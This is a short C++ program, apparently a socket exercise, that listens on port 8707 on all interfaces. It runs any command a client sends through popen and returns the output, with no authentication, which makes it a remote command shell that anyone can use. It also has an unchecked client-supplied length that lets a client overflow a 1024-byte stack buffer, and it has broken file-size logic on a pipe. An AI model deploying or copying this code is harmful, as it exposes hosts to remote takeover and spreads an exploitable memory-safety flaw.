#include <stdlib.h>
#include <stdio.h>
#include <iostream>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
void terminate_with_error(const char*error_msg,int sock) {// checks if the server made a socket or not and terminates with error if not
printf("%s\n",error_msg);// prints error messaage
perror("Socket Error:");
if(sock!= -1){close(sock);exit(1);}
}

int main (int argc,char ** argv){
	while(true){// infinite loop
	int sock;
	struct sockaddr_in serverAddr; //makes a socket adress struct
	struct sockaddr_in clientAddr;// makes a client socket adress struct
	socklen_t sin_size=sizeof(struct sockaddr_in);
	if((sock=socket(AF_INET,SOCK_STREAM,0)) == -1)terminate_with_error("Error CreatingSocket",sock);// checks if socks use INET protocol and STREAM type or terminates
	int sock_opt=1;

	setsockopt(sock,SOL_SOCKET,SO_REUSEADDR,(void*)&sock_opt,sizeof(sock_opt));// sets options  of socket
	serverAddr.sin_family=AF_INET;// uses INET
	serverAddr.sin_port=htons(8707);// defines port
	serverAddr.sin_addr.s_addr=INADDR_ANY;// sends to all ports
	bzero(&(serverAddr.sin_zero),8);// sets .

	if(bind(sock, (struct sockaddr*)&serverAddr,sizeof(struct sockaddr)) == -1)// checks if binding was made
		terminate_with_error("ErrorBinding",sock);
	if(listen(sock,10) == -1)
		terminate_with_error("Error Listening: ",sock);
	int newsock=accept(sock, (struct sockaddr*) &clientAddr,&sin_size);
	std::cout<< "you have been connected, executing new command:  "<< std::endl;// prints on screen
	
		if(newsock<1)
			terminate_with_error("Error Accepting Socket",0);
		else{
			int maxBytes=1024;
			char buffer[maxBytes]; // creates a buffer
			memset(buffer,0,maxBytes);// memsets to zero
			int y;
			recv(newsock, &y,4, 0);
			int bytes_read=recv(newsock,buffer,y,0);
			if(bytes_read>0){// condition
				printf("Received Message from %s:%d\n",(char*)inet_ntoa(clientAddr.sin_addr),clientAddr.sin_port);// prints on screen
			if (buffer[strlen(buffer)-2]=='\r') buffer[strlen(buffer)-2]='\0';// replaces return with a null
			if (buffer[strlen(buffer)-1]=='\n') buffer[strlen(buffer)-1]='\0';// replaces the return with a null
			
			FILE* f= popen(buffer, "r");// opens a file
			fseek(f,0,SEEK_END);// goes to last character
			long file_size= ftell(f);// retruns location of last pointer into a variable which carries the size eventually
			rewind(f);// goes to first character
			char * str= (char *) calloc(1024, 1);// allocates space in memory
			fread(str,1,file_size,f);// reads inside a file
			
			send(newsock, str, 1024, 0);
			pclose(f);// closes file equivalent to fclose
		}
	else perror("Error Receiving Message:");
			
close(newsock);// closres socket
	}
close(sock);// closes sockets
}
}

